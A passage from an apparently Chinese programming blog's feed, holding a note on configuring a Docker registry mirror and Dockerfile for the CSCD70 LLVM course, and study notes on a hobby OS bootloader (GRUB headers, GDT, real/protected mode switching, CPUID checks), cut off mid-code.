      <url>/2025/06/17/CSCD70%202023s%20Assignment%200%20Introduction%20to%20Docker%20%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="CSCD70-2023s-Assignment-0-Introduction-to-Docker-记录"><a href="#CSCD70-2023s-Assignment-0-Introduction-to-Docker-记录" class="headerlink" title="CSCD70 2023s Assignment 0 Introduction to Docker 记录"></a>CSCD70 2023s Assignment 0 Introduction to Docker 记录</h1><p>更新：我之后更换为了2023的实验，只要修改daemon.json即可</p><hr><p>直接进行build肯定会出现无法连接的报错。</p><p>这里由于众所周知的原因，需要配置源，使用代理和对docker配置代理以及在build命令中配置代理都是无效的，只有通过换源来解决。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>这里你也可以使用其他编辑器打开，修改或创建daemon.json文件输入以下语句，</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://hub.h-k.pw&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完成后不要着急build，需要修改一下dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LLVM_VERSION=<span class="number">12</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    env DEBIAN_FRONTEND=noninteractive \</span></span><br><span class="line"><span class="bash">    apt-get install -y \</span></span><br><span class="line"><span class="bash">        vim git build-essential python3-dev \</span></span><br><span class="line"><span class="bash">        wget ca-certificates \</span></span><br><span class="line"><span class="bash">        lsb-release software-properties-common gpg-agent &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apt/lists/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | apt-key add - &amp;&amp; \</span></span><br><span class="line"><span class="bash">    add-apt-repository <span class="string">&quot;deb http://apt.llvm.org/focal/ llvm-toolchain-focal-<span class="variable">$&#123;LLVM_VERSION&#125;</span> main&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get install -y llvm-<span class="variable">$&#123;LLVM_VERSION&#125;</span> llvm-<span class="variable">$&#123;LLVM_VERSION&#125;</span>-dev \</span></span><br><span class="line"><span class="bash">                       clang-<span class="variable">$&#123;LLVM_VERSION&#125;</span> \</span></span><br><span class="line"><span class="bash">                       clang-format-<span class="variable">$&#123;LLVM_VERSION&#125;</span> \</span></span><br><span class="line"><span class="bash">                       clang-tidy-<span class="variable">$&#123;LLVM_VERSION&#125;</span> &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apt/lists/*</span></span><br><span class="line"><span class="comment">#-------------修改的部分--------------</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> wget https://bootstrap.pypa.io/pip/3.8/get-pip.py &amp;&amp; \</span></span><br><span class="line"><span class="bash">    python3 get-pip.py &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -f get-pip.py</span></span><br><span class="line"><span class="comment">#------------------------------------</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip3 install lit==0.11.0 cmake==3.18.4</span></span><br></pre></td></tr></table></figure><p>主要是默认的pip已经不兼容ubuntu20.04默认自带的python3.8了，所以这里需要改变一下。</p><p>这样build过程就没有什么问题了，可以进行后面的测试了。</p>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> 编译原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>COSMOS 设置工作模式与环境</title>
      <link href="/2024/05/22/COSMOS-%E8%AE%BE%E7%BD%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E4%B8%8E%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/05/22/COSMOS-%E8%AE%BE%E7%BD%AE%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E4%B8%8E%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这段时间一直在学习写操作系统，看了网上LMOS老师的课，梳理一下第10到12课所学的知识，重点是对代码流程的简单描述，并对课程内容我个人之前不清楚的地方做简要补充记录，以供后面查找。</p><h1 id="实现GRUB头"><a href="#实现GRUB头" class="headerlink" title="实现GRUB头"></a>实现GRUB头</h1><h2 id="首先先看两个结构体"><a href="#首先先看两个结构体" class="headerlink" title="首先先看两个结构体"></a>首先先看两个结构体</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//映像文件头描述符</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_mlosrddsc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_mgic; <span class="comment">//映像文件标识</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfsum;<span class="comment">//未使用</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfsoff;<span class="comment">//未使用</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfeoff;<span class="comment">//未使用</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_sfrlsz;<span class="comment">//未使用</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_s;<span class="comment">//映像文件中二级引导器的开始偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_e;<span class="comment">//映像文件中二级引导器的结束偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_rsz;<span class="comment">//映像文件中二级引导器的实际大小</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrbk_sum;<span class="comment">//映像文件中二级引导器的校验和</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_s;<span class="comment">//映像文件中文件头描述的开始偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_e;<span class="comment">//映像文件中文件头描述的结束偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_rsz;<span class="comment">//映像文件中文件头描述的实际大小</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdbk_sum;<span class="comment">//映像文件中文件头描述的校验和</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_s;<span class="comment">//映像文件中文件数据的开始偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_e;<span class="comment">//映像文件中文件数据的结束偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_rsz;<span class="comment">//映像文件中文件数据的实际大小</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filbk_sum;<span class="comment">//映像文件中文件数据的校验和</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_ldrcodenr;<span class="comment">//映像文件中二级引导器的文件头描述符的索引号</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_fhdnr;<span class="comment">//映像文件中文件头描述符有多少个</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_filnr;<span class="comment">//映像文件中文件头有多少个</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_endgic;<span class="comment">//映像文件结束标识</span></span><br><span class="line">    <span class="keyword">u64_t</span> mdc_rv;<span class="comment">//映像文件版本</span></span><br><span class="line">&#125;<span class="keyword">mlosrddsc_t</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件头描述符</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_fhdsc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_type;<span class="comment">//文件类型</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_subtype;<span class="comment">//文件子类型</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_stuts;<span class="comment">//文件状态</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_id;<span class="comment">//文件id</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_intsfsoff;<span class="comment">//文件在映像文件位置开始偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_intsfend;<span class="comment">//文件在映像文件的结束偏移</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_frealsz;<span class="comment">//文件实际大小</span></span><br><span class="line">    <span class="keyword">u64_t</span> fhd_fsum;<span class="comment">//文件校验和</span></span><br><span class="line">    <span class="keyword">char</span>   fhd_name[FHDSC_NMAX];<span class="comment">//文件名</span></span><br><span class="line">&#125;<span class="keyword">fhdsc_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这两个结构体由<em>lmoskrlimg</em>写入，后面如何打包起来这里先不谈，我们现在只需要知道这是直接写好在文件中直接映射到内存的，我们只需要在代码中写入映像文件头描述符的地址即可</p><h2 id="GRUB头"><a href="#GRUB头" class="headerlink" title="GRUB头"></a>GRUB头</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MBT_HDR_FLAGSEQU 0x00010003;flag字段，指出OS映像需要引导程序提供或支持的特性</span><br><span class="line">MBT_HDR_MAGICEQU 0x1BADB002;多引导协议头魔数</span><br><span class="line">MBT2_MAGICEQU 0xe85250d6;第二版多引导协议头魔数</span><br><span class="line">global _start;导出_start符号</span><br><span class="line">extern inithead_entry;导入外部的inithead_entry函数符号</span><br><span class="line">[section .text];定义.text代码节</span><br><span class="line">[bits 32];汇编成32位代码</span><br><span class="line">_start:</span><br><span class="line">jmp _entry</span><br><span class="line">align 4</span><br><span class="line">mbt_hdr:</span><br><span class="line">dd MBT_HDR_MAGIC</span><br><span class="line">dd MBT_HDR_FLAGS</span><br><span class="line">dd -(MBT_HDR_MAGIC+MBT_HDR_FLAGS)</span><br><span class="line">dd mbt_hdr</span><br><span class="line">dd _start</span><br><span class="line">dd 0</span><br><span class="line">dd 0</span><br><span class="line">dd _entry</span><br><span class="line">;以上是GRUB所需要的头</span><br><span class="line">ALIGN 8</span><br><span class="line">mbhdr:</span><br><span class="line">DD0xE85250D6</span><br><span class="line">DD0</span><br><span class="line">DDmhdrend - mbhdr</span><br><span class="line">DD-(0xE85250D6 + 0 + (mhdrend - mbhdr))</span><br><span class="line">DW2, 0</span><br><span class="line">DD24</span><br><span class="line">DDmbhdr</span><br><span class="line">DD_start</span><br><span class="line">DD0</span><br><span class="line">DD0</span><br><span class="line">DW3, 0</span><br><span class="line">DD12</span><br><span class="line">DD_entry </span><br><span class="line">DD      0  </span><br><span class="line">DW0, 0</span><br><span class="line">DD8</span><br><span class="line">mhdrend:</span><br><span class="line">;以上是GRUB2所需要的头</span><br></pre></td></tr></table></figure><p>上面的数据既是GRUB，，这部分基本上是固定的，不过是提供给grub和grub2所需要到的头让其识别罢了，我们可以看到上面的start函数跳转到entry函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_entry:</span><br><span class="line">    ;关中断</span><br><span class="line">cli</span><br><span class="line">    ;关不可屏蔽中断</span><br><span class="line">in al, 0x70</span><br><span class="line">or al, 0x80</span><br><span class="line">out 0x70,al</span><br><span class="line">    ;重新加载GDT</span><br><span class="line">lgdt [GDT_PTR]</span><br><span class="line">jmp dword 0x8 :_32bits_mode</span><br></pre></td></tr></table></figure><p>entry函数的目的是关闭中断并加载加载GDT地址到GDTR寄存器,下面的数据就是GDT，是段描述符表，这里就不详细展开了，注释有简单解释</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0;一个空描述符，用于保护模式下的错误检查。</span><br><span class="line">kcode_dsc: dq 0x00cf9e000000ffff;32位代码段描述符，访问位 a-e</span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff;32位数据段描述符。</span><br><span class="line">k16cd_dsc: dq 0x00009e000000ffff;16位代码段描述符，访问位 a-e</span><br><span class="line">k16da_dsc: dq 0x000092000000ffff;16位数据段描述符</span><br><span class="line">GDT_END:</span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLENdw GDT_END-GDT_START-1;GDT界限</span><br><span class="line">GDTBASEdd GDT_START;GDT 的基地址</span><br></pre></td></tr></table></figure><p>上面的entry做完其任务后又跳转到32bits_mode函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_32bits_mode:</span><br><span class="line">;下面初始化C语言可能会用到的寄存器</span><br><span class="line">mov ax, 0x10; 数据段选择子(目的)，0000 0000 0001 0000，索引为2，32位数据段描述符</span><br><span class="line">mov ds, ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov es, ax</span><br><span class="line">mov fs, ax</span><br><span class="line">mov gs, ax</span><br><span class="line">xor eax,eax</span><br><span class="line">xor ebx,ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor edi,edi</span><br><span class="line">xor esi,esi</span><br><span class="line">xor ebp,ebp</span><br><span class="line">xor esp,esp</span><br><span class="line">    ;初始化栈，C语言需要栈才能工作</span><br><span class="line">mov esp,0x7c00</span><br><span class="line">    ;调用C语言函数inithead_entry</span><br><span class="line">call inithead_entry</span><br><span class="line">jmp 0x200000;inithead_entry在inithead_entry导入的initldrkrl.bin</span><br></pre></td></tr></table></figure><p>32bits_mode将段寄存器的段寄存器内的选择子索引指向的设置到32位数据段描述符上，并初始化寄存器还有栈，为后面调用C函数做铺垫，我们先来简单看看inithead_entry函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inithead_entry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    init_curs();<span class="comment">//初始化cursor_t结构体</span></span><br><span class="line">    close_curs();<span class="comment">//关闭光标</span></span><br><span class="line">    clear_screen(VGADP_DFVL);<span class="comment">//清除屏幕</span></span><br><span class="line">    write_realintsvefile(); </span><br><span class="line">    write_ldrkrlfile(); </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其主要作用是,清楚屏幕，然后找到inithead.bin，initldrkrl.bin的文件头描述符,并将其从映像文件中加载到其应该去的地址。其中<code>write_ldrkrlfile();</code>函数将二级引导器主模块加载到了0x200000的地址，以供上面的32bits_mode跳转到该模块。</p><h1 id="进入二级引导器"><a href="#进入二级引导器" class="headerlink" title="进入二级引导器"></a>进入二级引导器</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%include &quot;ldrasm.inc&quot;</span><br><span class="line">global _start</span><br><span class="line">global realadr_call_entry</span><br><span class="line">global IDT_PTR</span><br><span class="line">extern ldrkrl_entry</span><br><span class="line">[section .text]</span><br><span class="line">[bits 32]</span><br><span class="line">_start:</span><br><span class="line">_entry:</span><br><span class="line">cli</span><br><span class="line">lgdt [GDT_PTR];加载GDTR寄存器，GDT 是一个数据结构，包含了各种段描述符，例如代码段、数据段、系统段等。每个描述符定义了一个内存段的属性，如基地址、段限制、特权级等。</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Base Address  (32 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Limit         (16 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line"></span><br><span class="line">lidt [IDT_PTR];加载IDTR寄存器，IDT 是一个数据结构，包含了中断和异常处理程序的入口地址。每个中断或异常对应一个描述符，其中包含了处理程序的地址和特权级。</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Base Address  (32 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Limit         (16 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">jmp dword 0x8 :_32bits_mode</span><br><span class="line"></span><br><span class="line">_32bits_mode:</span><br><span class="line">mov ax, 0x10; 数据段选择子(目的)，0000 0000 0001 0000，索引为2，32位数据段描述符</span><br><span class="line">mov ds, ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov es, ax</span><br><span class="line">mov fs, ax</span><br><span class="line">mov gs, ax</span><br><span class="line">xor eax,eax</span><br><span class="line">xor ebx,ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor edi,edi</span><br><span class="line">xor esi,esi</span><br><span class="line">xor ebp,ebp</span><br><span class="line">xor esp,esp</span><br><span class="line">mov esp,0x90000</span><br><span class="line">call ldrkrl_entry</span><br><span class="line">xor ebx,ebx</span><br><span class="line">jmp 0x2000000</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">realadr_call_entry:</span><br><span class="line">pushad</span><br><span class="line">push    ds</span><br><span class="line">push    es</span><br><span class="line">push    fs</span><br><span class="line">push    gs</span><br><span class="line">call save_eip_jmp</span><br><span class="line">popgs</span><br><span class="line">popfs</span><br><span class="line">popes</span><br><span class="line">popds</span><br><span class="line">popad</span><br><span class="line">ret</span><br><span class="line">save_eip_jmp:</span><br><span class="line">pop esi ;此时栈底是储存的是call指令执行时保存的eip既&quot;pop gs&quot;这条指令的地址</span><br><span class="line">mov [PM32_EIP_OFF],esi;保存eip</span><br><span class="line">mov [PM32_ESP_OFF],esp;保存esp</span><br><span class="line">jmp dword far [cpmty_mode] ;长跳转这里表示把cpmty_mode处的第一个4字节装入eip，把其后的2字节装入cs，跳转到的代码文件在realintsve.asm</span><br><span class="line">cpmty_mode:</span><br><span class="line">dd 0x1000;EIP</span><br><span class="line">dw 0x18;CS 0000 0000 0001 1000,最后三位是RPL和TI，都为0 ，索引是3，;16位代码段描述符，访问位 a-e</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0;一个空描述符，用于保护模式下的错误检查。</span><br><span class="line">kcode_dsc: dq 0x00cf9a000000ffff ;32位代码段描述符，访问位 a-e</span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff ;32位数据段描述符。</span><br><span class="line">k16cd_dsc: dq 0x00009a000000ffff ;16位代码段描述符，访问位 a-e</span><br><span class="line">k16da_dsc: dq 0x000092000000ffff ;16位数据段描述符</span><br><span class="line">GDT_END:</span><br><span class="line"></span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLENdw GDT_END-GDT_START-1;GDT界限</span><br><span class="line">GDTBASEdd GDT_START ;GDT 的基地址</span><br><span class="line"></span><br><span class="line">IDT_PTR:</span><br><span class="line">IDTLENdw 0x3ff; IDT 的长度，这里设置为 0x3ff，即 1023。</span><br><span class="line">IDTBASdd 0; IDT 的基地址，这里设置为 0，这是BIOS中断表的地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上文件的start函数就是之前要跳转的位置，这个文件主要干的内容和之前一样，就是对各个寄存器，以及堆栈进行初始化跳转到ldrkrl_entry函数，这里先不谈ldrkrl_entry函数，这个ldrkrl_entry是二级引导器的主函数，我们先来看看后面的部分，因为后面这些功能是为我们主函数服务的，因为我们要调用bios中断，C语言代码工作在32位保护模式，要调用bios要使用实模式，所以我们要先实现一个realadr_call_entry函数来帮助我们的主函数去调用bios中断。</p><h1 id="realadr-call-entry函数"><a href="#realadr-call-entry函数" class="headerlink" title="realadr_call_entry函数"></a>realadr_call_entry函数</h1><p>我们先看看realadr_call_entry函数在c里的定义<code>void REGCALL realadr_call_entry(u16_t callint,u16_t val1,u16_t val2);//eax edx ecx</code>其中<strong>REGCALL</strong>是一个宏定义<code>#define REGCALL __attribute__((regparm(3)))//表示会用 3 个寄存器来传递参数（EAX、EDX 和 ECX），其余的参数通过堆栈来传递。</code>，也就是说当我们调用realadr_call_entry函数的时候会将三个参数传递到寄存器中，这点很重要，我们都知道汇编语言的函数是没有传参的说法的，这里的操作重点是改变EAX、EDX 和 ECX三个寄存器，通过比对不同的eax寄存器的值来跳转到不同的函数，我们下面来看看这一过程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">realadr_call_entry:</span><br><span class="line">pushad</span><br><span class="line">push    ds</span><br><span class="line">push    es</span><br><span class="line">push    fs</span><br><span class="line">push    gs</span><br><span class="line">call save_eip_jmp</span><br><span class="line">popgs</span><br><span class="line">popfs</span><br><span class="line">popes</span><br><span class="line">popds</span><br><span class="line">popad</span><br><span class="line">ret</span><br><span class="line">save_eip_jmp:</span><br><span class="line">pop esi ;此时栈底是储存的是call指令执行时保存的eip既&quot;pop gs&quot;这条指令的地址</span><br><span class="line">mov [PM32_EIP_OFF],esi;保存eip</span><br><span class="line">mov [PM32_ESP_OFF],esp;保存esp</span><br><span class="line">jmp dword far [cpmty_mode] ;长跳转这里表示把cpmty_mode处的第一个4字节装入eip，把其后的2字节装入cs，跳转到的代码文件在realintsve.asm</span><br><span class="line">cpmty_mode:</span><br><span class="line">dd 0x1000;EIP</span><br><span class="line">dw 0x18;CS 0000 0000 0001 1000,最后三位是RPL和TI，都为0 ，索引是3，;16位代码段描述符，访问位 a-e</span><br><span class="line">jmp $</span><br></pre></td></tr></table></figure><p>realadr_call_entry保存段寄存器后，跳转到了save_eip_jmp，当我们使用call指令后会将返回后要跳转的地址压入栈中，这里我们保存这一地址，并保留其堆栈地址，然后通过长跳转跳转到16位代码段描述符所记录的段，详细到段内地址是偏移0x1000的地址，关于这个地址的代码就像下图所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%include &quot;ldrasm.inc&quot;</span><br><span class="line">global _start</span><br><span class="line">[section .text]</span><br><span class="line">[bits 16]</span><br><span class="line">_start:</span><br><span class="line">_16_mode:</span><br><span class="line">    mov bp, 0x20 ;0000 0000 0010 0000，索引为4，16位数据段描述符</span><br><span class="line">    mov ds, bp</span><br><span class="line">    mov es, bp</span><br><span class="line">    mov ss, bp</span><br><span class="line">    mov ebp, cr0</span><br><span class="line">    and ebp, 0xfffffffe</span><br><span class="line">    mov cr0, ebp ;CR0.P=0 关闭保护模式</span><br><span class="line">    jmp 0:real_entry ;刷新CS影子寄存器，真正进入实模式</span><br><span class="line">real_entry:</span><br><span class="line">    mov bp,cs</span><br><span class="line">    mov ds, bp</span><br><span class="line">    mov es, bp</span><br><span class="line">    mov ss, bp</span><br><span class="line">    mov sp, 08000h ;设置栈顶</span><br><span class="line">    mov bp, func_table</span><br><span class="line">    add bp, ax</span><br><span class="line">    call [bp] ;调用函数表中的汇编函数，ax是C函数(使用realadr_call_entry符号传递参数)中传递进来的，根据不同的eax来控制调用不同函数</span><br><span class="line">    cli</span><br><span class="line">    call disable_nmi</span><br><span class="line">    mov ebp, cr0</span><br><span class="line">    or ebp, 1</span><br><span class="line">    mov cr0, ebp ;CR0.P=1 开启保护模式</span><br><span class="line">    jmp dword 0x8 : _32bits_mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[bits 32]</span><br><span class="line">_32bits_mode:</span><br><span class="line">    mov bp, 0x10;0000 0000 0001 0000，索引为2，32位数据段描述符</span><br><span class="line">    mov ds, bp</span><br><span class="line">    mov ss, bp ;重新设置保护模式下的段寄存器为32位数据段描述符</span><br><span class="line">mov esi,[PM32_EIP_OFF]</span><br><span class="line">mov esp,[PM32_ESP_OFF]</span><br><span class="line">jmp esi</span><br><span class="line"></span><br><span class="line">func_table: ;函数表，每项占两个字节</span><br><span class="line">dw _getmmap;获取内存布局视图的函数</span><br><span class="line">dw _read ;读取硬盘的函数</span><br><span class="line">    dw _getvbemode ;获取显卡VBE模式</span><br><span class="line">    dw _getvbeonemodeinfo ;获取显卡VBE模式的数据</span><br><span class="line">    dw _setvbemode ;设置显卡VBE模式</span><br></pre></td></tr></table></figure><p>这段代码省去了要跳转的几个函数的功能实现，其实这几个代码的功能都是从bios中断中获取数据最后保存起来。我们先来看看上面的部分，依旧是设定段选择子到16位数据段描述符，然后关闭保护模式进入实模式，也就是real_entry的部分，最为重点的是<code>call [bp] ;</code>这段代码，这里通过先将func_table的地址传入bp寄存器，然后因为传入的ax不同，<code>add bp, ax</code>的结果不同，通过这样的方式来告诉real_entry函数后面进入哪个函数。调用完函数会回到real_entry，然后关中断开启保护模式，重新设置寄存器，回到之前的位置，也就是realadr_call_entry的<code>pop     gs</code>这一行。</p><h1 id="init-bstartparm函数"><a href="#init-bstartparm函数" class="headerlink" title="init_bstartparm函数"></a>init_bstartparm函数</h1><p>我们接下来就要完善上面提到的ldrkrl_entry函数了，如果 ldrkrl_entry() 函数是总裁，那么 init_bstartparm() 函数则是经理，它负责管理检查 CPU 模式、收集内存信息，设置内核栈，设置内核字体、建立内核 MMU 页表数据。下面我们直接来看init_bstartparm函数的实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_bstartparm</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">machbstart_t</span>* mbsp = MBSPADR;<span class="comment">//1MB的内存地址</span></span><br><span class="line">    machbstart_t_init(mbsp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们要先在0x100000的地址初始化了一个机器信息结构 machbstart_t用于储存我们的信息</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">machbstart_t_init</span><span class="params">(<span class="keyword">machbstart_t</span>* initp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(initp,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">machbstart_t</span>));</span><br><span class="line">    initp-&gt;mb_migc=MBS_MIGC;<span class="comment">//设置魔数</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面我们在该函数中加入各种收集信息的函数。</p><h2 id="检测cpu是否支持"><a href="#检测cpu是否支持" class="headerlink" title="检测cpu是否支持"></a>检测cpu是否支持</h2><p>再开始收集信息之前我们先对cpu进行一个检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_chkcpu</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!chk_cpuid())<span class="comment">//检测cpuid功能是否支持</span></span><br><span class="line">    &#123;</span><br><span class="line">        kprint(<span class="string">&quot;Your CPU is not support CPUID sys is die!&quot;</span>);</span><br><span class="line">        CLI_HALT();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!chk_cpu_longmode())<span class="comment">//检测是否支持长模式</span></span><br><span class="line">    &#123;</span><br><span class="line">        kprint(<span class="string">&quot;Your CPU is not support 64bits mode sys is die!&quot;</span>);</span><br><span class="line">        CLI_HALT();</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_cpumode = <span class="number">64</span>;<span class="comment">//如果成功则设置机器信息结构的cpu模式为64位</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过改写EFLAGS寄存器的第21位，观察其位的变化判断是否支持CPUID,具体过程下面都有注释</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">chk_cpuid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rets = <span class="number">0</span>;</span><br><span class="line">    __asm__ __volatile__(<span class="comment">//__volatile__确保每次访问该变量时都直接从内存中读取或写入值，而不是从寄存器或其他缓存中获取。</span></span><br><span class="line">        <span class="string">&quot;pushfl \n\t&quot;</span><span class="comment">//EFLAGS寄存器压栈</span></span><br><span class="line">        <span class="string">&quot;pop %%eax \n\t&quot;</span><span class="comment">//将EFLAGS保存到eax中</span></span><br><span class="line">        <span class="string">&quot;movl %%eax,%%ebx \n\t&quot;</span><span class="comment">//将EAX寄存器的值复制到EBX寄存器中，用于之后的比较</span></span><br><span class="line">        <span class="string">&quot;xorl $0x0200000,%%eax \n\t&quot;</span><span class="comment">//对EAX寄存器的值进行异或操作，改变其第21位的值</span></span><br><span class="line">        <span class="string">&quot;pushl %%eax \n\t&quot;</span><span class="comment">//将修改后的EAX值压回栈中</span></span><br><span class="line">        <span class="string">&quot;popfl \n\t&quot;</span><span class="comment">//将栈顶的值弹出到EFLAGS寄存器中，更新EFLAGS的值</span></span><br><span class="line">        <span class="string">&quot;pushfl \n\t&quot;</span><span class="comment">//再次将EFLAGS的值压入栈中</span></span><br><span class="line">        <span class="string">&quot;popl %%eax \n\t&quot;</span><span class="comment">//将栈顶的值弹出到EAX寄存器中</span></span><br><span class="line">        <span class="string">&quot;xorl %%ebx,%%eax \n\t&quot;</span><span class="comment">//将EBX和EAX寄存器的值进行异或操作，用于检测EFLAGS的第21位是否发生了变化</span></span><br><span class="line">        <span class="string">&quot;jz 1f \n\t&quot;</span><span class="comment">//如果结果为0（即第21位没有变化），跳转到标签1</span></span><br><span class="line">        <span class="string">&quot;movl $1,%0 \n\t&quot;</span><span class="comment">//给rets赋值为0</span></span><br><span class="line">        <span class="string">&quot;jmp 2f \n\t&quot;</span><span class="comment">//跳转到2标签</span></span><br><span class="line">        <span class="string">&quot;1:movl $0,%0 \n\t&quot;</span><span class="comment">//给rets赋值为1</span></span><br><span class="line">        <span class="string">&quot;2: 